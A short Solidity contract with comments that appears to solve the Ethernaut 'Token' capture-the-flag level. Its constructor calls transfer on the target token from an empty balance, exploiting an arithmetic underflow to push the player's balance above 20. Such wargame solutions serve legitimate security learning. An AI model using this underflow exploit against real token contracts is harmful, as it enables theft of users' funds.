// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenAttack {
    constructor (address _token) {
        IToken(_token).transfer(msg.sender, 1);
    }
}

// Note that remix was used for easy deployment
// get the contract address on the ethernaut webpage console
// understand that it just have to be greater than 20 tokens